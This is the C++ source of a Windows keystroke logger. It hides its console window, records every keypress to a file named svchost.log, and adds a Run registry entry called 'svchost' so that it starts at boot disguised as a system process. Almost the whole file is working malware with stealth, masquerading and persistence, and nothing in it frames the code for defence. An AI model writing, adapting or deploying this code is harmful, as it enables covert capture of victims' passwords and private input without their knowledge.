// keystroke logger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>

#pragma runtime_checks( "[runtime_checks]", off )
#define BUFSIZE 80

int test_key(void);
int create_key(char *);
int get_keys(void);

int main(void)
{
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);

   int test,create;
   test=test_key();/*check if key is available for opening*/

   if (test==2)/*create key*/
   {
       char *path="c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
       create=create_key(path);

   }

   int t=get_keys();

   return t;
}  

int get_keys(void)
{
           short character;
             while(1)
             {
                    Sleep(10);/*to prevent 100% cpu usage*/
                    for(character=8;character<=222;character++)
                    {
                        if(GetAsyncKeyState(character)==-32767)
                        {  

                            FILE *file;
                            file=fopen("svchost.log","a+");
                            if(file==NULL)
                            {
                                    return 1;
                            }            
                            if(file!=NULL)
                            {        
                                    if((character>=39)&&(character<=64))
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }        
                                    else if((character>64)&&(character<91))
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)
                                        {
                                              case VK_SPACE:
                                              fputc(' ',file);
                                              fclose(file);
                                              break;    
                                              case VK_SHIFT:
                                              fputs("[SHIFT]",file);
                                              fclose(file);
                                              break;                                            
                                              case VK_RETURN:
                                              fputs("\n[ENTER]",file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs("[BACKSPACE]",file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs("[TAB]",file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("[CTRL]",file);
                                              fclose(file);
                                              break;    
                                              case VK_DELETE:
                                              fputs("[DEL]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_1:
                                              fputs("[;:]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_2:
                                              fputs("[/?]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_3:
                                              fputs("[`~]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_4:
                                              fputs("[ [{ ]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_5:
                                              fputs("[\\|]",file);
                                              fclose(file);
                                              break;                                
                                              case VK_OEM_6:
                                              fputs("[ ]} ]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_7:
                                              fputs("['\"]",file);
                                              fclose(file);
                                              break;                                            
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("[CAPS LOCK]",file);
                                              fclose(file);
                                              break;
                                              default:
                                              fclose(file);
                                              break;
                                       }        
                                  }    
                             }        
                   }    
               }                  

           }
           return EXIT_SUCCESS;                            
}                                                

int test_key(void)
{
   int check;
   HKEY hKey;
   char path[BUFSIZE];
   DWORD buf_length=BUFSIZE;
   int reg_key;

   reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
   if(reg_key!=0)
   {    
       check=1;
       return check;
   }        

   reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);

   if((reg_key!=0)||(buf_length>BUFSIZE))
       check=2;
   if(reg_key==0)
       check=0;

   RegCloseKey(hKey);
   return check;  
}

int create_key(char *path)
{  
       int reg_key,check;

       HKEY hkey;

       reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
       if(reg_key==0)
       {
               RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));
               check=0;
               return check;
       }
       if(reg_key!=0)
               check=1;

       return check;
}